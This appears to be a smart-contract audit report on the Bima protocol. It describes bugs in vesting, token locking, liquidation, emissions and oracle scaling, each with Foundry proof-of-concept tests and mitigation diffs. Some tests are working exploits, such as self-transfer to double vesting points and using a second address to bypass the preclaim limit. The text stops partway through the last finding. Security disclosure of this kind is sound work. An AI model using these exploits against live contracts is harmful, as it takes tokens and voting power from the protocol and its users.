### `AllocationVesting` contract can be exploited for infinite points via self-transfer

**Description:** The `AllocationVesting` contract gives points on vesting schedules to team members, investors, influencers and anyone else entitled to a token allocation.

`AllocationVesting::transferPoints` allows users to transfer points however this function does not correctly [handle](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/AllocationVesting.sol#L129-L133) self-transfer meaning users can exploit it by transferring points to themselves, giving themselves infinite points:
```solidity
// update storage - deduct points from `from` using memory cache
allocations[from].points = uint24(fromAllocation.points - points);

// we don't use fromAllocation as it's been modified with _claim()
allocations[from].claimed = allocations[from].claimed - claimedAdjustment;

// @audit doesn't correctly handle self-transfer since the memory
// cache of `toAllocation.points` will still contain the original
// value of `fromAllocation.points`, so this can be exploited by
// self-transfer to get infinite points
//
// update storage - add points to `to` using memory cache
allocations[to].points = toAllocation.points + uint24(points);
```

**Impact:** Anyone entitled to an allocation can give themselves infinite points and hence receive more tokens than they should receive.

**Proof of Concept:** Add the following PoC contract to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, IBabelVault, ITokenLocker} from "../TestSetup.sol";
import {AllocationVesting} from "./../../../contracts/dao/AllocationVesting.sol";

    AllocationVesting internal allocationVesting;

    uint256 internal constant totalAllocation = 100_000_000e18;
    uint256 internal constant maxTotalPreclaimPct = 10;

    function setUp() public virtual override {
        super.setUp();

        allocationVesting = new AllocationVesting(IERC20(address(babelToken)),
                                                  tokenLocker,
                                                  totalAllocation,
                                                  address(babelVault),
                                                  maxTotalPreclaimPct);
    }

    function test_InfinitePointsExploit() external {
        AllocationVesting.AllocationSplit[] memory allocationSplits
            = new AllocationVesting.AllocationSplit[](2);

        uint24 INIT_POINTS = 50000;

        // allocate to 2 users 50% 50%
        allocationSplits[0].recipient = users.user1;
        allocationSplits[0].points = INIT_POINTS;
        allocationSplits[0].numberOfWeeks = 4;

        allocationSplits[1].recipient = users.user2;
        allocationSplits[1].points = INIT_POINTS;
        allocationSplits[1].numberOfWeeks = 4;

        // setup allocations
        uint256 vestingStart = block.timestamp + 1 weeks;
        allocationVesting.setAllocations(allocationSplits, vestingStart);

        // warp to start time
        vm.warp(vestingStart + 1);

        // attacker transfers their total initial point balance to themselves
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, INIT_POINTS);

        // attacker then has double the points
        (uint24 points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*2);

        // does it again transferring the new larger value
        vm.prank(users.user1);
        allocationVesting.transferPoints(users.user1, users.user1, points);

        // has double again (4x from the initial points)
        (points, , , ) = allocationVesting.allocations(users.user1);
        assertEq(points, INIT_POINTS*4);

        // can go on forever to get infinite points
    }
}
```

Comment out the token transfer inside `AllocationVesting::_claim` since the setup is very basic:
```solidity
        // @audit commented out for PoC
        //vestingToken.transferFrom(vault, msg.sender, claimable);
```

Run with: `forge test --match-test test_InfinitePointsExploit`

**Recommended Mitigation:** Prevent self-transfer in `AllocationVesting::transferPoints`:
```diff
+   error SelfTransfer();

    function transferPoints(address from, address to, uint256 points) external callerOrDelegated(from) {
+       if(from == to) revert SelfTransfer();
```

### The `fetchRewards` function in `CurveDepositToken` and `ConvexDepositToken` causes a loss of accrued rewards

**Description:** The `fetchRewards` function in `CurveDepositToken` and `ConvexDepositToken` [fails](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L218-L221) to call `_updateIntegrals` prior to calling `_fetchRewards`.

This results in a loss of accrued rewards from `block.timestamp - lastUpdate` since:
* `_fetchRewards` [updates](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L243-L244) `lastUpdate` and `periodFinish` using `block.timestamp`
* hence future calls to `_updateIntegrals` will not [increase](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L199-L209) `rewardIntegral[i]` for the duration `block.timestamp - lastUpdate`

Note that [deposit](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L94-L95) and [withdraw](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/staking/Curve/CurveDepositToken.sol#L111-L112) always call `_updateIntegrals` immediately before calling `_fetchRewards`.

**Impact:** Loss of accrued rewards.

**Recommended Mitigation:** `fetchRewards` should call `_updateIntegrals` before calling `_fetchRewards`:
```diff
function fetchRewards() external {
    require(block.timestamp / 1 weeks >= periodFinish / 1 weeks, "Can only fetch once per week");
+   _updateIntegrals(address(0), 0, totalSupply);
    _fetchRewards();
}
```

`_updateIntegrals` also needs to be changed to not execute the final account-related section in this case:
```diff
+ if (account != address(0)) {
    uint256 integralFor = rewardIntegralFor[account][i];
    if (integral > integralFor) {
        storedPendingReward[account][i] += uint128((balance * (integral - integralFor)) / 1e18);
        rewardIntegralFor[account][i] = integral;
    }
+ }
```

### Impossible to liquidate borrower when a `TroveManager` instance only has 1 active borrower

**Description:** When a `TroveManager` instance only has 1 active borrower it is impossible to liquidate that borrower since `LiquidationManager::liquidateTroves` only executes code within the [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L166) loop and [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L192) statement when `troveCount > 1`:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (trovesRemaining > 0 && troveCount > 1) {
...
if (trovesRemaining > 0 && !troveManagerValues.sunsetting && troveCount > 1) {
```

Because the code inside the `while` loop and `if` statement never gets executed, `totals.totalDebtInSequence` is never set to a value which results in this [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L230):
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

The same problem applies to `LiquidationManager::batchLiquidateTroves` which has a similar [while](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L287) loop and [if](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L314) statement condition:
```solidity
uint256 troveCount = troveManager.getTroveOwnersCount();
...
while (troveIter < length && troveCount > 1) {
...
if (troveIter < length && troveCount > 1) {
```

And [reverts](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L360) with the same error:
```solidity
require(totals.totalDebtInSequence > 0, "TroveManager: nothing to liquidate");
```

**Impact:** It is impossible to liquidate a borrower when a `TroveManager` instance only has 1 active borrower. The borrower can be liquidated once other borrowers become active on the same `TroveManager` instance but this can result in late liquidation with loss of funds to the protocol.

Additionally it is permanently impossible to liquidate the last active borrower in a `TroveManager` that is sunsetting, since in that case no new active borrowers can be created.

**Proof of Concept:** Add the following PoC contract to `test/foundry/core/LiquidationManagerTest.t.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {BorrowerOperationsTest} from "./BorrowerOperationsTest.t.sol";

contract LiquidationManagerTest is BorrowerOperationsTest {

    function setUp() public virtual override {
        super.setUp();

        // verify staked btc trove manager enabled for liquidation
        assertTrue(liquidationMgr.isTroveManagerEnabled(stakedBTCTroveMgr));
    }

    function test_impossibleToLiquidateSingleBorrower() external {
        // depositing 2 BTC collateral (price = $60,000 in MockOracle)
        // use this test to experiment with different hard-coded values
        uint256 collateralAmount = 2e18;

        uint256 debtAmountMax
            = (collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
              - INIT_GAS_COMPENSATION;

        _openTrove(users.user1, collateralAmount, debtAmountMax);

        // set new value of btc to $1 which should ensure liquidation
        mockOracle.setResponse(mockOracle.roundId() + 1,
                               int256(1 * 10 ** 8),
                               block.timestamp + 1,
                               block.timestamp + 1,
                               mockOracle.answeredInRound() + 1);
        // warp time to prevent cached price being used
        vm.warp(block.timestamp + 1);

        // then liquidate the user - but it fails since the
        // `while` and `for` loops get bypassed when there is
        // only 1 active borrower!
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidate(stakedBTCTroveMgr, users.user1);

        // attempting to use the other liquidation function has same problem
        uint256 mcr = stakedBTCTroveMgr.MCR();
        vm.expectRevert("LiquidationManager: nothing to liquidate");
        liquidationMgr.liquidateTroves(stakedBTCTroveMgr, 1, mcr);

        // the borrower is impossible to liquidate
    }
}
```

Run with `forge test --match-test test_impossibleToLiquidateSingleBorrower`.

**Recommended Mitigation:** Simply changing `troveCount >= 1` results in a panic divide by zero inside `TroveManager::_redistributeDebtAndColl`. A possible solution is to add the following in that function:
```diff
        uint256 totalStakesCached = totalStakes;

+       // if there is only 1 trove open and that is being liquidated, prevent
+       // a panic during liquidation due to divide by zero
+       if(totalStakesCached == 0) {
+           totalStakesCached = 1;
+       }

        // Get the per-unit-staked terms
```

With this change it appears safe to enable `troveCount >= 1` everywhere but inside `LiquidationManager::liquidateTroves` there is some code that [looks for other troves](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/LiquidationManager.sol#L196-L205) which may cause problems if executing when only 1 Trove exists.

Note: in the existing code there is this [comment](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L1083-L1086) which indicates that "liquidating the final trove" is blocked to allow a `TroveManager` being sunset to be closed. But the current implementation prevents liquidation of any single trove at any time.

The suggested fix may prevent a sunsetting `TroveManager` from being closed if the last trove is liquidated since this would result in a state where `defaultedDebt > 0` and hence `TroveManager::getEntireSystemDebt` would return > 0 which causes this [check](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/BorrowerOperations.sol#L124) to return false.

**Bima:**
We will handle this by having or own trove on each `TroveManager` with minimal debt and highest CR. This will ensure everyone is liquidatable and also during sunsetting we can just close our own trove which will be the final one.


### Permanent loss of `BabelToken` if a disabled emissions receiver doesn't call `Vault::allocateNewEmissions`

**Description:** `BabelToken` is permanently lost if a disabled emissions receiver doesn't call `Vault::allocateNewEmissions` as:
* `Vault::_allocateTotalWeekly` allocates `BabelToken` according to total weekly votes which contain votes for disabled receivers
* if a disabled receiver doesn't call `Vault::allocateNewEmissions`, the already allocated tokens for the receiver won't be used to increase `BabelVault::unallocatedTotal` - they will simply be "lost"
* `Vault::allocateNewEmissions` can only be called by the receiver and a disabled receiver doesn't have any incentive to call this function
* The loss of tokens increases with the amount of disabled receivers

**Impact:** Permanent loss of `BabelToken` after disabling emissions receivers.

**Proof of Concept:** Add the PoC function to test/foundry/dao/VaultTest.t.sol:
```solidity
function test_allocateNewEmissions_tokensLostAfterDisablingReceiver() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // receiver to be disabled later
    address receiver1 = address(mockEmissionReceiver);
    uint256 RECEIVER_ID1 = _vaultRegisterReceiver(receiver1, 1);

    // ongoing receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER_ID2 = _vaultRegisterReceiver(receiver2, 1);

    // user votes for receiver1 to get emissions with 50% of their points
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID1;
    votes[0].points = incentiveVoting.MAX_POINTS() / 2;
    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user votes for receiver2 to get emissions with 50% of their points
    votes[0].id = RECEIVER_ID2;
    vm.prank(users.user1);
    incentiveVoting.vote(users.user1, votes, false);

    // disable emission receiver 1 prior to calling allocateNewEmissions
    vm.prank(users.owner);
    babelVault.setReceiverIsActive(RECEIVER_ID1, false);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache current system week
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver2);
    uint256 allocatedToEachReceiver = babelVault.allocateNewEmissions(RECEIVER_ID2);

    // verify BabelVault::totalUpdateWeek is current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify receiver1 and receiver2 have the same allocated amounts
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);
    assertEq(firstWeekEmissions, allocatedToEachReceiver * 2);

    // if receiver1 doesn't call allocateNewEmissions the tokens they would
    // have received would never be allocated. Only if receiver1 calls allocateNewEmissions
    // do the tokens move into BabelVault::unallocatedTotal
    //
    // verify unallocated is increasing if receiver1 calls allocateNewEmissions
    vm.prank(receiver1);
    babelVault.allocateNewEmissions(RECEIVER_ID1);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions + allocatedToEachReceiver);

    // since receiver1 was disabled they have no incentive to call allocateNewEmissions
    // allocateNewEmissions only allows the receiver to call it so admin is
    // unable to rescue those tokens
}
```

Run with: `forge test --match-test test_allocateNewEmissions_tokensLostAfterDisablingReceiver`

**Recommended Mitigation:** Anyone should be able to call `Vault::allocateNewEmissions` for disabled receivers to recover the allocated funds. And voting shouldn't be allowed for disabled receivers to prevent users from voting for disabled receivers to "steal" emissions from enabled receivers they don't like.

### Loss of user locked voting tokens due to unsafe downcast overflow

**Description:** `TokenLocker::AccountData` [stores](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L41-L49) the account's current `locked`, `unlocked` and `frozen` balances using `uint32`:
```solidity
struct AccountData {
    // Currently locked balance. Each week the lock weight decays by this amount.
    uint32 locked;
    // Currently unlocked balance (from expired locks, can be withdrawn)
    uint32 unlocked;
    // Currently "frozen" balance. A frozen balance is equivalent to a `MAX_LOCK_WEEKS` lock,
    // where the lock weight does not decay weekly. An account may have a locked balance or a
    // frozen balance, never both at the same time.
    uint32 frozen;
```

Inside `TokenLocker::_lock` the input `uint256 _amount` token value which the user is locking gets unsafely [downcast](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L450) into `uint32`:
```solidity
accountData.locked = uint32(accountData.locked + _amount);
```

Then in `TokenLocker::_weeklyWeightWrite`, `accountData.locked` is [read](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L914) into a `uint256` in the calculation to update the `unlocked` amount but this is useless as the downcast has already occurred:
```solidity
uint256 locked = accountData.locked;
```

Finally in `TokenLocker::withdrawExpiredLocks` this will either [revert](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L765-L780) with "No unlocked tokens" if the overflow resulted in 0, or will transfer back to the user far less tokens than they initially locked up:
```solidity
function withdrawExpiredLocks(uint256 _weeks) external returns (bool) {
    _weeklyWeightWrite(msg.sender);
    getTotalWeightWrite();

    AccountData storage accountData = accountLockData[msg.sender];
    uint256 unlocked = accountData.unlocked;
    require(unlocked > 0, "No unlocked tokens");
    accountData.unlocked = 0;
    if (_weeks > 0) {
        _lock(msg.sender, unlocked, _weeks);
    } else {
        lockToken.transfer(msg.sender, unlocked * lockToTokenRatio);
        emit LocksWithdrawn(msg.sender, unlocked, 0);
    }
    return true;
}
```

**Impact:** Loss of user locked voting tokens due to unsafe downcast overflow.

**Proof of Concept:** For a simple example, in `test/foundry/TestSetup.sol` set `INIT_BAB_TKN_TOTAL_SUPPLY` to something greater than `type(uint32).max` and set `INIT_LOCK_TO_TOKEN_RATIO = 1` eg:
```solidity
uint256 internal constant INIT_LOCK_TO_TOKEN_RATIO = 1;
uint256 internal constant INIT_BAB_TKN_TOTAL_SUPPLY = 1_000_000e18;
```

**Recommended Mitigation:** Limit the total supply of the voting token to be `<= type(uint32).max * lockToTokenRatio` and use OpenZeppelin's `SafeCast` [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) instead of performing unsafe downcasts.

The supply limit should be placed inside `BabelVault::setInitialParameters` like this:
```solidity
// enforce invariant described in TokenLocker to prevent overflows
require(totalSupply <= type(uint32).max * locker.lockToTokenRatio(),
        "Total supply must be <= type(uint32).max * lockToTokenRatio");
```

### Maximum preclaim limit can be easily bypassed to preclaim entire token allocation

**Description:** The `AllocationVesting` contract allows token recipients to preclaim up to a maximum of their total token allocation, however this limit can easily by passed allowing recipients to preclaim their entire allocations.

**Impact:** Token allocation recipients can preclaim their entire allocations. Since preclaim performs a max-length lock via `TokenLocker`, this can be abused to quickly gain far greater voting power in the DAO than would otherwise be possible.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/AllocationInvestingTest.t.sol`:
```solidity
function test_transferPoints_BypassVestingViaPreclaim() external {
    AllocationVesting.AllocationSplit[] memory allocationSplits
        = new AllocationVesting.AllocationSplit[](2);

    uint24 INIT_POINTS = 50000;

    // allocate to 2 users 50% 50%
    allocationSplits[0].recipient = users.user1;
    allocationSplits[0].points = INIT_POINTS;
    allocationSplits[0].numberOfWeeks = 4;

    allocationSplits[1].recipient = users.user2;
    allocationSplits[1].points = INIT_POINTS;
    allocationSplits[1].numberOfWeeks = 4;

    // setup allocations
    uint256 vestingStart = block.timestamp + 1 weeks;
    allocationVesting.setAllocations(allocationSplits, vestingStart);

    // warp to start time
    vm.warp(vestingStart + 1);

    // each entity receiving allocations is entitled to 10% preclaim
    // which they can use to get voting power by locking it up in TokenLocker
    uint256 MAX_PRECLAIM = (maxTotalPreclaimPct * totalAllocation) / (2 * 100);

    // user1 does this once, passing 0 to preclaim max possible
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // user1 has now preclaimed the max allowed
    (, , , uint96 preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 attempts it again
    vm.prank(users.user1);
    allocationVesting.lockFutureClaimsWithReceiver(users.user1, users.user1, 0);

    // but nothing additional is preclaimed
    (, , , preclaimed) = allocationVesting.allocations(users.user1);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user 1 needs to wait 3 days to bypass LockedAllocation revert
    vm.warp(block.timestamp + 3 days);

    // user1 calls `transferPoints` to move their points to a new address
    address user1Second = address(0x1337);
    vm.prank(users.user1);
    allocationVesting.transferPoints(users.user1, user1Second, INIT_POINTS);

    // since `transferPoints` doesn't transfer preclaimed amounts, the
    // new address has its preclaimed amount as 0
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, 0);

    // user1 now uses their secondary address to preclaim a second time!
    vm.prank(user1Second);
    allocationVesting.lockFutureClaimsWithReceiver(user1Second, user1Second, 0);

    // user1 was able to claim 2x the max preclaim
    (, , , preclaimed) = allocationVesting.allocations(user1Second);
    assertEq(preclaimed, MAX_PRECLAIM);

    // user1 can continue this strategy to preclaim their entire
    // token allocation which would give them significantly greater
    // voting power in the DAO, since each preclaim performs a max
    // length lock via TokenLocker to give voting weight
}
```

Comment out the token transfers inside `AllocationVesting::_claim` and `lockFutureClaimsWithReceiver` since the setup is very basic.

Run with: `forge test --match-test test_transferPoints_BypassVestingViaPreclaim`

**Recommended Mitigation:** In `AllocationVesting::transferPoints` perform the following storage update *before* all the other storage updates:
```solidity
// update storage - if from has a positive preclaimed balance,
// transfer preclaimed amount in proportion to points tranferred
// to prevent point transfers being used to bypass the maximum preclaim limit
if(fromAllocation.preclaimed > 0) {
    uint96 preclaimedToTransfer = SafeCast.toUint96((uint256(fromAllocation.preclaimed) * points) /
                                                    fromAllocation.points);

    // this should never happen but sneaky users may try preclaiming and
    // point transferring using very small amounts so prevent this
    if(preclaimedToTransfer == 0) revert PositivePreclaimButZeroTransfer();

    allocations[to].preclaimed = toAllocation.preclaimed + preclaimedToTransfer;
    allocations[from].preclaimed = fromAllocation.preclaimed - preclaimedToTransfer;
}
```

### When `BabelVault` uses an `EmissionSchedule` but receivers have no voting weight, the vault's unallocated supply will decrease even though no tokens are being allocated

**Description:** When `BabelVault` uses an `EmissionSchedule` but receivers have no voting weight, the vault's unallocated supply will decrease even though no tokens are being allocated.

**Impact:** Tokens are effectively lost since the vault's unallocated supply decreases but no tokens are actually allocated to receivers.

**Proof of Concept:** Add the following PoC to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated() external {
    // first need to fund vault with tokens
    test_setInitialParameters();

    // owner registers receiver
    address receiver = address(mockEmissionReceiver);
    vm.prank(users.owner);
    assertTrue(babelVault.registerReceiver(receiver, 1));

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint256 RECEIVER_ID = 1;
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // entire supply still not allocated
    uint256 initialUnallocated = babelVault.unallocatedTotal();
    assertEq(initialUnallocated, INIT_BAB_TKN_TOTAL_SUPPLY);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify unallocated supply reduced by weekly emission percent
    uint256 firstWeekEmissions = INIT_BAB_TKN_TOTAL_SUPPLY*INIT_ES_WEEKLY_PCT/MAX_PCT;
    assertTrue(firstWeekEmissions > 0);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated - firstWeekEmissions);

    // verify emissions correctly set for current week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // verify BabelVault::lockWeeks reduced correctly
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver active and last processed week = system week
    (, bool isActive, uint16 updatedWeek) = babelVault.idToReceiver(RECEIVER_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // however even though BabelVault::unallocatedTotal was reduced by the
    // first week emissions, nothing was allocated to the receiver
    assertEq(allocated, 0);

    // this is because EmissionSchedule::getReceiverWeeklyEmissions calls
    // IncentiveVoting::getReceiverVotePct which looks back 1 week, and receiver
    // had no voting weight and there was no total voting weight at all in that week
    assertEq(incentiveVoting.getTotalWeightAt(systemWeek-1), 0);
    assertEq(incentiveVoting.getReceiverWeightAt(RECEIVER_ID, systemWeek-1), 0);

    // tokens were effectively lost since the vault's unallocated supply decreased
    // but no tokens were actually allocated to receivers since there was no
    // voting weight
}
```

Run with: `orge test --match-test test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated`

**Recommended Mitigation:** If planning to use an `EmissionSchedule` with `BabelVault`, the safest mitigation is to ensure that at least one user always has:
* locked their tokens with `TokenLocker`
* registered their voting weight with `IncentiveVoting`
* voted for at least 1 emissions receiver

Another option is to changing the code of `EmissionSchedule::getTotalWeeklyEmissions` to:
1) call `IncentiveVoting::getTotalWeightWrite`
2) call `IncentiveVoting::getTotalWeightAt(week-1)` to get the total weight for the previous week
3) if total weight for previous week was 0, `EmissionSchedule::getTotalWeeklyEmissions` could return 0 and not modify any storage such as `lockWeeks`.

The risk is that this code change may have unintended consequences in other parts of the system.

**Bima:**
We will use the first mitigation ensuring that at least one user has locked their tokens, registered their voting weights and voted for at least 1 emission receiver.


### Disabled receiver can lose tokens that were allocated for past weeks if not regularly claiming emissions

**Description:** When a receiver is disabled by `Vault::setReceiverIsActive`, they can lose tokens which they were eligible to receive in past weeks if they have not been regularly claiming emissions.

**Impact:** A disabled receiver can lose tokens which they were eligible for.

**Proof of Concept:** A receiver can be disabled using `Vault::setReceiverIsActive`.

```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}
```

When a receiver claims allocated tokens using `Vault::allocateNewEmissions`, the allocated tokens for the past weeks will be added to the receiver if they are active but refunded to the unallocated supply if they have been disabled.

```solidity
if (receiver.isActive) {
    allocated[msg.sender] += amount;

    emit IncreasedAllocation(msg.sender, amount);
}
// otherwise return allocation to the unallocated supply
else {
    uint256 unallocated = unallocatedTotal + amount;
    unallocatedTotal = SafeCast.toUint128(unallocated);
    ...
}
```

So a receiver can lose tokens if they are disabled without claiming the allocated tokens for past weeks, even though they were eligible to receive those tokens during those past weeks.

Similarly if a receiver is disabled then later enabled, when the receiver calls `Vault::allocateNewEmissions` they'll receive tokens for the past weeks they were disabled.

**Recommended Mitigation:** If this is not the intended behavior, `Vault::setReceiverIsActive` should claim already allocated tokens before disabling a receiver. Similarly when enabling a previously disabled receiver that receiver's updated week should be set to the current system week to prevent tokens being claimed for past weeks when the receiver was disabled.

**Bima:**
Acknowledged.


### `IncentiveVoting::unfreeze` doesn't remove votes if a user has voted with unfrozen weight prior to freezing

**Description:** `IncentiveVoting::unfreeze` doesn't remove votes if a user has voted with unfrozen weight prior to freezing.

**Impact:** Users keep their past votes unexpectedly after unfreezing their locks with `keepIncentivesVote = false`.

**Proof of Concept:** Add the PoC function to `test/foundry/dao/VaultTest.t.sol`:
```solidity
function test_unfreeze_failToRemoveActiveVotes() external {
    // setup vault giving user1 half supply to lock for voting power
    _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // verify user1 has 1 unfrozen lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0); // 0 frozen amount
    assertEq(activeLockData[0].amount, 2147483647);
    assertEq(activeLockData[0].weeksToUnlock, 52);

    // register receiver
    uint256 RECEIVER_ID = _vaultRegisterReceiver(address(mockEmissionReceiver), 1);

    // user1 votes for receiver
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // verify user1 has 1 active vote
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);

    // user1 freezes their lock
    vm.prank(users.user1);
    tokenLocker.freeze();

    // verify user1 has 1 frozen lock
    (activeLockData, frozenAmount) = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 0); // 0 active lock
    assertGt(frozenAmount, 0); // positive frozen amount

    // user1 unfreezes without keeping their past votes
    vm.prank(users.user1);
    tokenLocker.unfreeze(false); // keepIncentivesVote = false

    // BUT user1 still has 1 active vote which is not an intended design
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);
}
```

Run with: `forge test --match-test test_unfreeze_failToRemoveActiveVotes`

**Recommended Mitigation:** `unfreeze` should remove votes even if `frozenWeight` is zero:
```diff
    function unfreeze(address account, bool keepVote) external returns (bool success) {
        // only tokenLocker can call this function
        require(msg.sender == address(tokenLocker));

        // get storage reference to account's lock data
        AccountData storage accountData = accountLockData[account];

        // cache account's frozen weight
        uint256 frozenWeight = accountData.frozenWeight;

-        // if frozenWeight == 0, the account was not registered so nothing needed
        if (frozenWeight > 0) {
            // same as before
        }
+       else if (!keepVote) {
+            // clear previous votes
+            if (accountData.voteLength > 0) {
+                _removeVoteWeights(account, getAccountCurrentVotes(account), 0);
+
+                accountData.voteLength = 0;
+                accountData.points = 0;
+
+                emit ClearedVotes(account, week);
+            }
+        }

        success = true;

### `StorkOracleWrapper` downscales 18 decimal price to 8 decimals then `PriceFeed` upscales to 18 decimals resulting in inaccurate price

**Description:** `StorkOracleWrapper` returns hard-coded 8 decimals:
```solidity
function decimals() external pure returns (uint8 dec) {
    dec = 8;
}
```

And its functions `getRoundData` and `latestRoundData` always downscale the native 18-decimal price to 8 decimals:
```solidity
answer = int256(quantizedValue / 1e10);
```

But `PriceFeed` always converts Oracle values to 18 decimals:
```solidity
uint256 public constant TARGET_DIGITS = 18;

function _scalePriceByDigits(uint256 _price, uint256 _answerDigits) internal pure returns (uint256 scaledPrice) {
    if (_answerDigits == TARGET_DIGITS) {
        scaledPrice = _price;
    } else if (_answerDigits < TARGET_DIGITS) {
        // Scale the returned price value up to target precision
        scaledPrice = _price * (10 ** (TARGET_DIGITS - _answerDigits));
    } else {
        // Scale the returned price value down to target precision
        scaledPrice = _price / (10 ** (_answerDigits - TARGET_DIGITS));
    }
}
```

